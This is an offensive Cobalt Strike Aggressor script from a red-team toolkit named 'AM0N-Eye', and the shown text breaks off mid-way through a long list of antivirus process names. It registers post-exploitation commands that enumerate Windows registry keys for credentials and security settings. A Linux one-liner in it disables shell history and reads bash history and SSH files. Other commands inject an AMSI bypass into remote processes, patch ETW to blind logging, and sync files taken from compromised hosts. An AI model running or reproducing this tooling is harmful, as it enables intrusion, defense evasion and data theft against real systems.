#
# Default script for AM0N  Aggressor
#
debug(5);
menubar("AM0N-Eye", "AM0N-Eye");
menubar("RedTeam-Ops !",   "attacks");
menubar("Server", "Server");

popup AM0N-Eye {
	item "Reset Data" {
		prompt_confirm("This action will clear AM0N 's data model. You will lose all\ninformation collected up to this point. You will not be able to get\nit back. Press 'Yes' to reset the data model.", "Reset Data", {
			resetData();
		});
	}

	item "Export Data" {
		openExportDataDialog();

	}
		        	separator();	
     item("About AM0N Actor",  { url_open("https://www.linkedin.com/in/abdulrehman-ali-4472a3243"); });
     item("About AM0N", { openAboutDialog(); });
    	
}



sub enumerate_windows {
    $username = beacon_info($1,"user");
    
    bpwd($1);
    bdrives($1);
    bps($1);

    # Local File Locations
    bls($1,"C:\\");
    bls($1,"C:\\Program Files");
    bls($1,"C:\\Program Files \(x86\)");
    bls($1,"C:\\ProgramData");
    bls($1,"C:\\Users\\".$username."\\Documents");
    bls($1,"C:\\Users\\".$username."\\Desktop");
    bls($1,"C:\\Users\\".$username."\\Downloads");
    bls($1,"C:\\Users\\".$username."\\AppData\\Roaming");
    bls($1,"C:\\Users\\".$username."\\AppData\\Local");
    bls($1,"C:\\Users\\".$username."\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
    
    # .NET CLR Installed Versions
    bls($1,"C:\\Windows\\Microsoft.Net\\Framework");
    
    # .NET CLR 2.0 installed
    #bls($1,"C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727");

    # .NET CLR 4.0 installed
    #bls($1,"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319");

    # Potential Mapped Drives
    bls($1,"E:\\");
    bls($1,"F:\\");
    bls($1,"G:\\");
    bls($1,"Z:\\");

    # Operating System
    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x64");
    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion", "x64");
    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", "x64");
    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", "x64");
    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", "x64");

    # System Hardware/BIOS
    breg_query($1, "HKLM\\HARDWARE\\DESCRIPTION\\System", "x64");
    breg_query($1, "HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS", "x64");

    # System Policies
    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", "x64");
    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "x64");
    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "x64");
    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "x64");

    # Powershell Version 2
    breg_query($1, "HKLM\\Software\\Microsoft\\PowerShell\\1\\PowerShellEngine", "x64");
    
    # Powershell Version 5
    breg_query($1, "HKLM\\Software\\Microsoft\\PowerShell\\3\\PowerShellEngine", "x64");
    
    # Powershell Logging
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell", "x64");
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\Transcription", "x64");
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\ScriptBlockLogging", "x64");
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\ModuleLogging", "x64");

    # Recently Typed Commands and URLS
    breg_query($1, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "x64");
    breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x64");

    # Installed Software
    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "x86");
    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "x64");

    # Installed Services
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services","x64");

    # Mapped Drives
    breg_query($1, "HKCU\\Network", "x64");
    breg_query($1, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2", "x64");

    # Environment Variables

    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment", "x64");
    breg_query($1, "HKCU\\Environment", "x64");

    # Internet Explorer Proxy Settings
    breg_query($1,"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
    breg_query($1,"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
    breg_query($1,"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections");

    # Firewall Profiles
    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", "x64");
    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "x64");
    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "x64");
   

    # LSA Settings
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa", "x64");
    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "x64");

    # Secure Boot
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", "x64");

    # LAPS Admin Password Management
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd", "x64");
    
    # Windows Installer
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer", "x64");
    breg_query($1, "HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer", "x64");

    # Event Log Forwarding
    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding\\SubscriptionManager", "x64");

    # Winlogon (AutoLogon, AutoLogin, ScreenSaverGrace)
    breg_query($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "x64");

    # Windows Update
    breg_query($1, "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate", "x64");
    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\CCMSetup", "x64");
    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\SMS\\Mobile Client", "x64");

    # LANMAN
    breg_query($1, "HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters", "x64");
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity", "x64");

    # Wdigest
    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "x64");
    
    # Kerberos
    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Kerberos\\Parameters", "x64");
    
    # Service Group Order
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\ServiceGroupOrder\\Security", "x64");

    # Software Specific
    # Putty
    breg_query($1, "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions", "x64");
    breg_query($1, "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions", "x86");

    # Sysmon
    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters", "x64");
    breg_queryv($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters", "Rules", "x64");

}

sub enumerate_linux {
    # Bash one-liner for host enumeration
    local('$commands');
    local('$encoded');

    $commands = " unset HISTFILE HISTFILESIZE HISTSIZE;hostname;w;uname -a;date;date -u;cat /etc/*-release;env;lastlog 2>/dev/null;ls -al /home ~ ~/.ssh /tmp /dev/shm;df -h;mount;sudo -l;cat ~/.bash_history ~/.known_hosts /etc/hosts /etc/resolv.conf;ifconfig -a; ps aux; netstat -pantl";

    #$encoded = "echo " . base64_encode($commands) . "|base64 -d|bash";
    #bpinut($1, "\c0Executing the following commands: " . $commands);
    #bshell($1, $encoded);

    bshell($1, $commands);
    
}

beacon_command_register(
    "enumerate", 
    "Perform OPSEC safe host enumeration with built-in commands", 
    "Use: enumerate\n\nPerform Windows host enumeration with OPSEC safe techniques.");

alias enumerate {
    btask($1, "\c0Performing Windows host enumeration! (OPSEC Safe)", "T1082");
    enumerate_windows($1);

}

##############
# SSH Alias
##############

ssh_command_register(
    "enumerate", 
    "Perform OPSEC safe host enumeration with built-in commands", 
    "Use: enumerate\n\nPerform Linux host enumeration with OPSEC safe techniques.");

ssh_alias enumerate {
    btask($1, "\c0Performing Linux host enumeration! (OPSEC Safe)", "T1082");
    enumerate_linux($1);
}

beacon_command_register(
    "amsi-inject", 
    "Bypass AMSI in a remote process with code injection.", 
    "Synopsis: amsi-inject PID"
);

alias amsi-inject {
    if(size(@_) != 2)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("amsi-inject"));
        return;
    }
    local('$handle $data $args');
    $handle = openf(script_resource("amsi-inject.o"));
    $data = readb($handle, -1);
    closef($handle);
    $args = bof_pack($1, "i",$2);
    btask($1, "Inject AMSI Bypass ( )");
    beacon_inline_execute($1, $data, "go", $args);
}

beacon_command_register(
"etw", 
"Start or stop ETW logging.", 
"etw stop - patch out EtwEventWrite in Ntdll.dll to prevent ETW-based logging.
etw start - patch back in EtwEventWrite in Ntdll.dll to restart ETW-based logging.");

alias etw {
	local('$barch $handle $data $args');

	if(size(@_) != 2)
	{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("etw"));
		return;
	}

	if(($2 eq "start")||($2 eq "stop"))
	{
		# figure out the arch of this session
		$barch  = barch($1);
		
		# read in the right BOF file
		$handle = openf(script_resource("etw. $+ $barch $+ .o"));
		$data   = readb($handle, -1);
		closef($handle);

		# pack our arguments
		$args = bof_pack($1, "z", $2);
		
		# announce what we're doing
		btask($1, "Running ETW patching BOF (@ajpc500)");
		
		# execute it.
		beacon_inline_execute($1, $data, "go", $args);
	}else{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("etw"));
		return;
	}
}

global('%downloadSyncLocation');


sub downloadAll {
    import java.util.regex.Matcher;
    import java.util.regex.Pattern;
    import java.io.File;

    local('$currentMetaPath');
    local('$rPath $rName $lPath $rId $rBid');

    $currentMetaPath = %downloadSyncLocation[data_query('localip')] . "/";
    
    $rPath = $1['path'];
    $rName = $1['name'];
    $lPath = $1['lpath'];
    $rID   = $1['id'];
    $rBid  = $1['bid'];  

    # Match a typical filesytem path, not UNC
    if ($rPath ismatch '^[A-Za-z]:.*$')
    {
        local('$currentBase');
        local('$pattern $matcher');

        $pattern = [ Pattern compile: "[A-Za-z](?=:)" ];
        $matcher = [ $pattern matcher: $rPath ];

        if ( [ $matcher find ] )
        {
            local('$currentFullLocalPath');

            $currentFullLocalPath =  binfo($rBid, "computer") . "_" . replace(binfo($rBid, "internal"), '\.', '_');
            $currentFullLocalPath .= "/" . [ $matcher group: 0 ];
            $currentFullLocalPath .= replace($rPath, [ $matcher group: 0 ] . ':', '');
            $currentFullLocalPath =  replace($currentFullLocalPath, '\\\\', '/') . $rName;

            # Create variable for Java object
            local('$path');
            $path = [ new File: $currentFullLocalPath ];

            if ( !-isDir ($currentMetaPath . [ $path getParent]) )
            {
                println("Making directory: " . ($currentMetaPath . [ $path getParent ]));
                mkdir($currentMetaPath . [ $path getParent ]);
            }
            
            if (size(@_) == 2)
            {
                if ($2 ismatch 'OVERWRITE')
                {
                    if (-isFile ($currentMetaPath . [ $path getParent ] . "/" . $rName))
                    {
                        sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                            println("Downloaded and overwrote: $1 [ $+ $rName $+ ]");
                            }, \$rName));
                    }
                    else
                    {
                        sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                            println("Downloaded: $1 [ $+ $rName $+ ]");
                            }, \$rName));
                    }
                }
            }
            else if ( !-isFile ($currentMetaPath . [ $path getParent ] . "/" . $rName) )
            {
                sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                    println("Downloaded: $1 [ $+ $rName $+ ]");
                }, \$rName));
            }
        }

    }
    else
    {
        if ($rPath ismatch '^\\\\.*$')
        {
            $rPath = replace($rPath, '\\\\\\\\', '');
            $rPath = replace($rPath, '\\\\', '/');
            
            local('$currentFullLocalPath');

            $currentFullLocalPath = $rPath . $rName;

            # Create variable for Java object
            local('$path');
            $path = [ new File: $currentFullLocalPath ];

            if ( !-isDir ($currentMetaPath . [ $path getParent]) )
            {
                mkdir($currentMetaPath . [ $path getParent ]);
            }

            if (size(@_) == 2)
            {
                if ($2 ismatch 'OVERWRITE')
                {
                    if (-isFile ($currentMetaPath . [ $path getParent ] . "/" . $rName))
                    {
                        sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                            println("Downloaded and overwrote: $1 [ $+ $rName $+ ]");
                            }, \$rName));
                    }
                    else
                    {
                        sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                            println("Downloaded: $1 [ $+ $rName $+ ]");
                        }, \$rName));
                    }
                }
            }
            else if ( !-isFile ($currentMetaPath . [ $path getParent ] . "/" . $rName) )
            {
                sync_download($lPath, ($currentMetaPath . [ $path getParent ] . "/" . $rName), lambda({
                    println("Downloaded: $1 [ $+ $rName $+ ]");
                }, \$rName));
            }
        }
    }
}


alias sync_beacon_downloads {
    local('$download');
    local('@currentReturnString');
    local('@currentQueue');

	if (data_query('localip') !in (keys(%downloadSyncLocation)))
	{
		berror($1, "No download location set, you must run set_sync_location first!");
		return;
	}

    foreach $download (downloads())
    {
        if ($download['bid'] ismatch $1)
        {
            if (size(@_) >= 2)
            {
                if (('.*' . lc($download['path'] . $download['name'])) ismatch ('.*' . lc($2) . '.*$'))
                {
                    @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
                    @currentQueue = add(@currentQueue, $download);
                }
            }
            else
            {
                @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
                @currentQueue = add(@currentQueue, $download);
            }
        }
    }

    if (size(@currentReturnString) >= 1)
    {
        local('$downloadQueue');

        blog($1, "Current Downloads in Queue:\n\t" . join("\n\t", sorta(@currentReturnString)));

        foreach $downloadQueue (@currentQueue)
        {
            if (size(@_) == 3)
            {
                if ($3 ismatch 'OVERWRITE')
                {
                    downloadAll($downloadQueue, 'OVERWRITE');
                }
                else
                {
                    downloadAll($downloadQueue);
                }
            }
            downloadAll($downloadQueue);
        }

        show_message("Downloads and directories for beacon synced.");
    }
    else
    {
        berror($1, "No downloads matching criteria found.");
    }
}


alias show_beacon_downloads {
    local('$download');
    local('@currentReturnString');

    foreach $download (downloads())
    {
        if ($download['bid'] ismatch $1)
        {
            if (size(@_) == 2)
            {
                if ((lc($download['path'] . $download['name'])) ismatch ('.*' . lc($2) . '.*$'))
                {
                    @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
                }
            }
            else
            {
                @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
            }
        }
    }

    if (size(@currentReturnString) >= 1)
    {
        blog($1, "Current Downloads Matching Criteria in Current Beacon:\n\t" . join("\n\t", sorta(@currentReturnString)));
    }
    else
    {
        berror($1, "No downloads matching criteria found.");
    }
}


alias sync_all_beacon_downloads {
    local('$download');
    local('@currentReturnString');
    local('@currentQueue');

	if (data_query('localip') !in (keys(%downloadSyncLocation)))
	{
		berror($1, "No download location set, you must run set_sync_location first!");
		return;
	}

    foreach $download (downloads())
    {
        if (size(@_) >= 2)
        {
            if (('.*' . lc($download['path'] . $download['name'])) ismatch ('.*' . lc($2) . '.*$'))
            {
                @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
                @currentQueue = add(@currentQueue, $download);
            }
        }
        else
        {
            @currentReturnString = add(@currentReturnString, ($download['path'] . $download['name']));
            @currentQueue = add(@currentQueue, $download);
        }
    }

    if (size(@currentReturnString) >= 1)
    {
        local('$downloadQueue');

        blog($1, "Current Downloads in Queue:\n\t" . join("\n\t", sorta(@currentReturnString)));

        foreach $downloadQueue (@currentQueue)
        {
            if (size(@_) == 3)
            {
                if ($3 ismatch 'OVERWRITE')
                {
                    downloadAll($downloadQueue, 'OVERWRITE');
                }
                else
                {
                    downloadAll($downloadQueue);
                }
            }

            downloadAll($downloadQueue);
        }

        show_message("Downloads and directories for beacon synced.");
    }
    else
    {
        berror($1, "No downloads matching criteria found.");
    }
}


alias search_all_beacon_downloads {
    local('$download');
    local('$currentRPath');
    local('@currentReturnString');

    foreach $download (downloads())
    {
        if (size(@_) == 2)
        {
            if ((lc($download['path'] . $download['name'])) ismatch ('.*' . lc($2) . '.*$'))
            {
                @currentReturnString = add(@currentReturnString, (binfo(($download['bid']), "internal") . "@" . binfo($download['bid'], "pid") . "\t->\t" . $download['path'] . $download['name']));
            }
        }
        else
        {
            @currentReturnString = add(@currentReturnString, (binfo(($download['bid']), "internal") . "@" . binfo(($download['bid']), "pid") . "\t->\t" . $download['path'] . $download['name']));
        }
    }

    if (size(@currentReturnString) >= 1)
    {
        blog($1, "Current Downloads Matching Criteria:\n\t" . join("\n\t", sorta(@currentReturnString)));
    }
    else
    {
        berror($1, "No downloads matching criteria found.");
    }
}


alias set_sync_location {
	local('$syncRootPath');

	if (size(@_) != 2)
	{
		berror($1, "You must specify a local path to download a path tree to.");
		return;
	}

	if (!-isDir $2)
	{
		berror($1, "The path you specified does not exist on the system. You must create it first.");
		return;
	}

	%downloadSyncLocation[data_query('localip')] = $2;
	blog($1, "Set download location root for TeamServer: " . %downloadSyncLocation[data_query('localip')]);
}


alias show_sync_location {
	if (data_query('localip') !in (keys(%downloadSyncLocation)))
	{
		berror($1, "No download location set for this TeamServer.");
		return;
	}
	else
	{
		blog($1, "Download location for TeamServer: " . %downloadSyncLocation[data_query('localip')]);
	}
}


# Registration of alisases for usage within Beacons
beacon_command_register("show_sync_location", "Shows sync location for downloads.", "Usage: show_sync_location");

beacon_command_register("set_sync_location", "Set the root path for synced downloads", "Usage: set_sync_location path_to_base_directory");

beacon_command_register("show_beacon_downloads", "Show all Downloads associated with your current Beacon.", "Usage: show_beacon_downloads [optional string to match]");

beacon_command_register("sync_beacon_downloads", "Sync all Downloads from current Beacon.", "Usage: sync_beacon_downloads [optional string to match] [OVERWRITE]");

beacon_command_register("sync_all_beacon_downloads", "Sync all Downloads.", "Usage: sync_all_beacon_downloads [optional string to match] [OVERWRITE]");

beacon_command_register("search_all_beacon_downloads", "Show all Downloads", "Usage: search_all_beacon_downloads [optional string to match]");


set BEACON_OUTPUT_PS {

    $bd = bdata($1);
    @av = @("Tanium.exe", "360RP.exe", "360SD.exe", "360Safe.exe", "360leakfixer.exe", "360rp.exe", "360safe.exe", "360sd.exe", "360tray.exe", "AAWTray.exe", "ACAAS.exe", "ACAEGMgr.exe", "ACAIS.exe", "AClntUsr.EXE", "ALERT.EXE", "ALERTSVC.EXE", "ALMon.exe", "ALUNotify.exe", "ALUpdate.exe", "ALsvc.exe", "AVENGINE.exe", "AVGCHSVX.EXE", "AVGCSRVX.EXE", "AVGIDSAgent.exe", "AVGIDSMonitor.exe", "AVGIDSUI.exe", "AVGIDSWatcher.exe", "AVGNSX.EXE", "AVKProxy.exe", "AVKService.exe", "AVKTray.exe", "AVKWCtl.exe", "AVP.EXE", "AVP.exe", "AVPDTAgt.exe", "AcctMgr.exe", "Ad-Aware.exe", "Ad-Aware2007.exe", "AddressExport.exe", "AdminServer.exe", "Administrator.exe", "AeXAgentUIHost.exe", "AeXNSAgent.exe", "AeXNSRcvSvc.exe", "AlertSvc.exe", "AlogServ.exe", "AluSchedulerSvc.exe", "AnVir.exe", "AppSvc32.exe", "AtrsHost.exe", "Auth8021x.exe", "AvastSvc.exe", "AvastUI.exe", "Avconsol.exe", "AvpM.exe", "Avsynmgr.exe", "Avtask.exe", "BLACKD.exe", "BWMeterConSvc.exe", "CAAntiSpyware.exe", "CALogDump.exe", "CAPPActiveProtection.exe", "CAPPActiveProtection.exe", "CB.exe", "CCAP.EXE", "CCenter.exe", "CClaw.exe", "CLPS.exe", "CLPSLA.exe", "CLPSLS.exe", "CNTAoSMgr.exe", "CPntSrv.exe", "CTDataLoad.exe", "CertificationManagerServiceNT.exe", "ClShield.exe", "ClamTray.exe", "ClamWin.exe", "Console.exe", "CylanceUI.exe", "DAO_Log.exe", "DLService.exe", "DLTray.EXE", "DLTray.exe", "DRWAGNTD.EXE", "DRWAGNUI.EXE", "DRWEB32W.EXE", "DRWEBSCD.EXE", "DRWEBUPW.EXE", "DRWINST.EXE", "DSMain.exe", "DWHWizrd.exe", "DefWatch.exe", "DolphinCharge.exe", "EHttpSrv.exe", "EMET_Agent.exe", "EMET_Service.exe", "EMLPROUI.exe", "EMLPROXY.exe", "EMLibUpdateAgentNT.exe", "ETConsole3.exe", "ETCorrel.exe", "ETLogAnalyzer.exe", "ETReporter.exe", "ETRssFeeds.exe", "EUQMonitor.exe", "EndPointSecurity.exe", "EngineServer.exe", "EntityMain.exe", "EtScheduler.exe", "EtwControlPanel.exe", "EventParser.exe", "FAMEH32.exe", "FCDBLog.exe", "FCH32.exe", "FPAVServer.exe", "FProtTray.exe", "FSCUIF.exe", "FSHDLL32.exe", "FSM32.exe", "FSMA32.exe", "FSMB32.exe", "FWCfg.exe", "FireSvc.exe", "FireTray.exe", "FirewallGUI.exe", "ForceField.exe", "FortiProxy.exe", "FortiTray.exe", "FortiWF.exe", "FrameworkService.exe", "FreeProxy.exe", "GDFirewallTray.exe", "GDFwSvc.exe", "HWAPI.exe", "ISNTSysMonitor.exe", "ISSVC.exe", "ISWMGR.exe", "ITMRTSVC.exe", "ITMRT_SupportDiagnostics.exe", "ITMRT_TRACE.exe", "IcePack.exe", "IdsInst.exe", "InoNmSrv.exe", "InoRT.exe", "InoRpc.exe", "InoTask.exe", "InoWeb.exe", "IsntSmtp.exe", "KABackReport.exe", "KANMCMain.exe", "KAVFS.EXE", "KAVStart.exe", "KLNAGENT.EXE", "KMailMon.exe", "KNUpdateMain.exe", "KPFWSvc.exe", "KSWebShield.exe", "KVMonXP.exe", "KVMonXP_2.exe", "KVSrvXP.exe", "KWSProd.exe", "KWatch.exe", "KavAdapterExe.exe", "KeyPass.exe", "KvXP.exe", "LUALL.EXE", "LWDMServer.exe", "LockApp.exe", "LockAppHost.exe", "LogGetor.exe", "MCSHIELD.EXE", "MCUI32.exe", "MSASCui.exe", "ManagementAgentNT.exe", "McAfeeDataBackup.exe", "McEPOC.exe", "McEPOCfg.exe", "McNASvc.exe", "McProxy.exe", "McScript_InUse.exe", "McWCE.exe", "McWCECfg.exe", "Mcshield.exe", "Mctray.exe", "MgntSvc.exe", "MpCmdRun.exe", "MpfAgent.exe", "MpfSrv.exe", "MsMpEng.exe", "NAIlgpip.exe", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NCDaemon.exe", "NIP.exe", "NJeeves.exe", "NLClient.exe", "NMAGENT.EXE", "NOD32view.exe", "NPFMSG.exe", "NPROTECT.EXE", "NRMENCTB.exe", "NSMdtr.exe", "NTRtScan.exe", "NVCOAS.exe", "NVCSched.exe", "NavShcom.exe", "Navapsvc.exe", "NaveCtrl.exe", "NaveLog.exe", "NaveSP.exe", "Navw32.exe", "Navwnt.exe", "Nip.exe", "Njeeves.exe", "Npfmsg2.exe", "Npfsvice.exe", "NscTop.exe", "Nvcoas.exe", "Nvcsched.exe", "Nymse.exe", "OLFSNT40.EXE", "OMSLogManager.exe", "ONLINENT.exe", "ONLNSVC.exe", "OfcPfwSvc.exe", "PASystemTray.exe", "PAVFNSVR.exe", "PAVSRV51.exe", "PNmSrv.exe", "POPROXY.EXE", "POProxy.exe", "PPClean.exe", "PPCtlPriv.exe", "PQIBrowser.exe", "PSHost.exe", "PSIMSVC.EXE", "PXEMTFTP.exe", "PadFSvr.exe", "Pagent.exe", "Pagentwd.exe", "PavBckPT.exe", "PavFnSvr.exe", "PavPrSrv.exe", "PavProt.exe", "PavReport.exe", "Pavkre.exe", "PcCtlCom.exe", "PcScnSrv.exe", "PccNTMon.exe", "PccNTUpd.exe", "PpPpWallRun.exe", "PrintDevice.exe", "ProUtil.exe", "PsCtrlS.exe", "PsImSvc.exe", "PwdFiltHelp.exe", "Qoeloader.exe", "RAVMOND.exe", "RAVXP.exe", "RNReport.exe", "RPCServ.exe", "RSSensor.exe", "RTVscan.exe", "RapApp.exe", "Rav.exe", "RavAlert.exe", "RavMon.exe", "RavMonD.exe", "RavService.exe", "RavStub.exe", "RavTask.exe", "RavTray.exe", "RavUpdate.exe", "RavXP.exe", "RealMon.exe", "Realmon.exe", "RedirSvc.exe", "RegMech.exe", "ReporterSvc.exe", "RouterNT.exe", "Rtvscan.exe", "SAFeService.exe", "SAService.exe", "SAVAdminService.exe", "SAVFMSESp.exe", "SAVMain.exe", "SAVScan.exe", "SCANMSG.exe", "SCANWSCS.exe", "SCFManager.exe", "SCFService.exe", "SCFTray.exe", "SDTrayApp.exe", "SEVINST.EXE", "SMEX_ActiveUpdate.exe", "SMEX_Master.exe", "SMEX_RemoteConf.exe", "SMEX_SystemWatch.exe", "SMSECtrl.exe", "SMSELog.exe", "SMSESJM.exe", "SMSESp.exe", "SMSESrv.exe", "SMSETask.exe", "SMSEUI.exe", "SNAC.EXE", "SNAC.exe", "SNDMon.exe", "SNDSrvc.exe", "SPBBCSvc.exe", "SPIDERML.EXE", "SPIDERNT.EXE", "SSM.exe", "SSScheduler.exe", "SVCharge.exe", "SVDealer.exe", "SVFrame.exe", "SVTray.exe", "SWNETSUP.EXE", "SavRoam.exe", "SavService.exe", "SavUI.exe", "ScanMailOutLook.exe", "SeAnalyzerTool.exe", "SemSvc.exe", "SescLU.exe", "SetupGUIMngr.exe", "SiteAdv.exe", "Smc.exe", "SmcGui.exe", "SnHwSrv.exe", "SnICheckAdm.exe", "SnIcon.exe", "SnSrv.exe", "SnicheckSrv.exe", "SpIDerAgent.exe", "SpntSvc.exe", "SpyEmergency.exe", "SpyEmergencySrv.exe", "StOPP.exe", "StWatchDog.exe", "SymCorpUI.exe", "SymSPort.exe", "TBMon.exe", "TFGui.exe", "TFService.exe", "TFTray.exe", "TFun.exe", "TIASPN~1.EXE", "TSAnSrf.exe", "TSAtiSy.exe", "TScutyNT.exe", "TSmpNT.exe", "TmListen.exe", "TmPfw.exe", "Tmntsrv.exe", "Traflnsp.exe", "TrapTrackerMgr.exe", "UPSCHD.exe", "UcService.exe", "UdaterUI.exe", "UmxAgent.exe", "UmxCfg.exe", "UmxFwHlp.exe", "UmxPol.exe", "Up2date.exe", "UpdaterUI.exe", "UrlLstCk.exe", "UserActivity.exe", "UserAnalysis.exe", "UsrPrmpt.exe", "V3Medic.exe", "V3Svc.exe", "VPC32.exe", "VPDN_LU.exe", "VPTray.exe", "VSStat.exe", "VsStat.exe", "VsTskMgr.exe", "WEBPROXY.EXE", "WFXCTL32.EXE", "WFXMOD32.EXE", "WFXSNT40.EXE", "WebProxy.exe", "WebScanX.exe", "WinRoute.exe", "WrSpySetup.exe", "ZLH.exe", "Zanda.exe", "ZhuDongFangYu.exe", "Zlh.exe", "_avp32.exe", "_avpcc.exe", "_avpm.exe", "aAvgApi.exe", "aawservice.exe", "acaif.exe", "acctmgr.exe", "ackwin32.exe", "aclient.exe", "adaware.exe", "advxdwin.exe", "aexnsagent.exe", "aexsvc.exe", "aexswdusr.exe", "aflogvw.exe", "afwServ.exe", "agentsvr.exe", "agentw.exe", "ahnrpt.exe", "ahnsd.exe", "ahnsdsv.exe", "alertsvc.exe", "alevir.exe", "alogserv.exe", "alsvc.exe", "alunotify.exe", "aluschedulersvc.exe", "amon9x.exe", "amswmagt.exe", "anti-trojan.exe", "antiarp.exe", "antivirus.exe", "ants.exe", "aphost.exe", "apimonitor.exe", "aplica32.exe", "aps.exe", "apvxdwin.exe", "arr.exe", "ashAvast.exe", "ashBug.exe", "ashChest.exe", "ashCmd.exe", "ashDisp.exe", "ashEnhcd.exe", "ashLogV.exe", "ashMaiSv.exe", "ashPopWz.exe", "ashQuick.exe", "ashServ.exe", "ashSimp2.exe", "ashSimpl.exe", "ashSkPcc.exe", "ashSkPck.exe", "ashUpd.exe", "ashWebSv.exe", "ashdisp.exe", "ashmaisv.exe", "ashserv.exe", "ashwebsv.exe", "asupport.exe", "aswDisp.exe", "aswRegSvr.exe", "aswServ.exe", "aswUpdSv.exe", "aswUpdsv.exe", "aswWebSv.exe", "aswupdsv.exe", "atcon.exe", "atguard.exe", "atro55en.exe", "atupdater.exe", "atwatch.exe", "atwsctsk.exe", "au.exe", "aupdate.exe", "aupdrun.exe", "aus.exe", "auto-protect.nav80try.exe", "autodown.exe", "autotrace.exe", "autoup.exe", "autoupdate.exe", "avEngine.exe", "avadmin.exe", "avcenter.exe", "avconfig.exe", "avconsol.exe", "ave32.exe", "avengine.exe", "avesvc.exe", "avfwsvc.exe", "avgam.exe", "avgamsvr.exe", "avgas.exe", "avgcc.exe", "avgcc32.exe", "avgcsrvx.exe", "avgctrl.exe", "avgdiag.exe", "avgemc.exe", "avgfws8.exe", "avgfws9.exe", "avgfwsrv.exe", "avginet.exe", "avgmsvr.exe", "avgnsx.exe", "avgnt.exe", "avgregcl.exe", "avgrssvc.exe", "avgrsx.exe", "avgscanx.exe", "avgserv.exe", "avgserv9.exe", "avgsystx.exe", "avgtray.exe", "avguard.exe", "avgui.exe", "avgupd.exe", "avgupdln.exe", "avgupsvc.exe", 